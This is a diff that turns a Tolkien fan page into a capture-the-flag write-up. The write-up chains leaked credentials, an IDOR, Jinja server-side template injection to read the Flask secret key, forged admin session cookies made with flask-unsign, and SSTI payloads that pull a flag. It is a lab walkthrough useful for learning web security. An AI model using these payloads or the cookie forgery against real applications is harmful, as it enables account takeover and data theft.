@@ -1,46 +1,87 @@
-# Tolkien Fan Club
+# WRITE UP: The Memories [IDOR → SSTI → Session Forgery → Admin → Flag]
 
-![JRR Tolkien sitting](/images/tolkien.png)
+- NOTE : Hints are not a part of write-up.
 
-Here's the deal, **I like Tolkien**.
+## Overview
 
-> "I am in fact a Hobbit in all but size."
->
-> -- J.R.R. Tolkien
+This challenge demonstrates a multi-step exploitation chain combining:
 
-## Blog posts
+- Credential leakage
+- IDOR (Insecure Direct Object Reference)
+- SSTI (Server-Side Template Injection)
+- Flask session forgery
+- SSTI (Server-Side Template Injection)
 
-- [Why Glorfindel is More Impressive than Legolas](/blog/glorfindel)
-- [Why Tom Bombadil Was a Mistake](/blog/tom)
-- [The Unparalleled Majesty of "The Lord of the Rings"](/blog/majesty)
+Goal: escalate from a low-privileged user (`student_7`) to `rangrez_admin` and extract the flag.
 
-## Reasons I like Tolkien
+## Recon
 
-- You can spend years studying the legendarium and still not understand its depths
-- It can be enjoyed by children and adults alike
-- Disney _didn't ruin it_ (okay, but Amazon might have)
-- It created an entirely new genre of fantasy
+- Checked page source and `/static/robots.txt`
+- Found credentials:
+  ```
+  username: student_7
+  password: holi123
+  ```
 
-## My favorite characters (in order)
+## Login
 
-1. Gandalf
-2. Bilbo
-3. Sam
-4. Glorfindel
-5. Galadriel
-6. Elrond
-7. Thorin
-8. Sauron
-9. Aragorn
+Login as `student_7` to gain access to user-controlled memory.
 
-Here's what `elflang` looks like (the perfect coding language):
+## IDOR
+
+Access hidden memory:
 
 ```
-func main(){
-    fmt.Println("Aiya, Ambar!")
-}
+/memory/13
 ```
 
-Want to get in touch? [Contact me here](/contact).
+- Owned by `rangrez_admin`
+- Not visible but accessible via direct reference
 
-This site was generated with a custom-built [static site generator](https://www.boot.dev/courses/build-static-site-generator-python) from the course on [Boot.dev](https://www.boot.dev).
+## SSTI Discovery
+
+- Application renders user-controlled input via Jinja
+- `student_x` users → `SandboxedEnvironment` (The CTF was set in order to restrict direct flag discovery without session forgery).
+- `rangrez_admin` → full `Environment` (no sandbox)
+
+## Secret Key Extraction
+
+From SSTI:
+
+```
+{{ config['SECRET_KEY'] }}
+app.secret_key = "r4ngr3z-arch1v3-k3y-2026"
+```
+
+## Session Forgery
+
+Forge cookie:
+
+```json
+flask-unsign --sign --cookie '{"user": "rangrez_admin", "overrides": {} }' --secret 'r4ngr3z-arch1v3-k3y-2026'
+{"user":"rangrez_admin","overrides":{}}
+```
+
+Sign using the secret key and replace browser cookie.
+
+## Admin Access
+
+Now running in **unsandboxed Jinja environment**.
+
+## Final SSTI Payloads
+
+### Payloads
+
+```jinja2
+{{ self.__init__.__globals__['FLAG'] }}
+```
+
+```jinja2
+{{ self.__dict__._TemplateReference__context.get('FLAG') }}
+```
+
+## Flag
+
+```
+TCHNVTE{1d0r_plus_sst1_rang_d3_d1y4}
+```
